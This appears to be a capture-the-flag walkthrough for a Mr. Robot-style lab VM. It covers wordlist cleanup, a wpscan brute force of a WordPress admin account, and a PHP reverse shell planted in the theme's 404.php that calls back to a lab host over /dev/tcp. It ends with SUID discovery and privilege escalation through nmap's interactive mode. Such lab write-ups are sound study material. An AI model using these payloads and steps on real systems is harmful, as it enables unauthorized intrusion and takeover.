
---
tags
	#SUID 
---
Finding fsocity.dic in robots.txt

```bash
wget http://192.168.52.129/fsocity.dic
```

A dictionary file, commonly identified by the .dic extension, serves as a foundational component in brute force attacks and directory discovery during penetration testing. Unlike a standard text file meant for human consumption, a dictionary file is structured specifically for automated tools to iterate through potential passwords or hidden paths line by line. Because these files are often compiled from diverse sources like ***data breaches*** or ***binary extractions***, they frequently contain non-printable characters or redundant entries that can hinder the performance of scanners. Processing the raw data with commands such as strings is essential to filter out binary noise, while sorting and removing duplicates ensures that the final wordlist is both clean and efficient for the target environment. Maintaining a high-quality dictionary file directly impacts the speed and success rate of gaining initial access to a system.

Use `strings` to filter out readable strings.

```bash
strings fsocity.dic | sort | uniq > final_wordlist.txt 
```

Brute forcing :

```bash
wpscan --url http://192.168.52.129 -U Elliot -P final_wordlist.txt
```

Notice that Elliot is an admin user, edit 404.php in Appearance : 

```php
<?php passthru("bash -c 'bash -i >& /dev/tcp/192.168.52.128/4444 0>&1'"); ?> 
```

Start `nc` listening and get a reverse shell, upgrade it.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Take advantage of  the old version `nmap` for PrevSec because it has interactive mode.

```bash
nmap --interactive
!sh
```
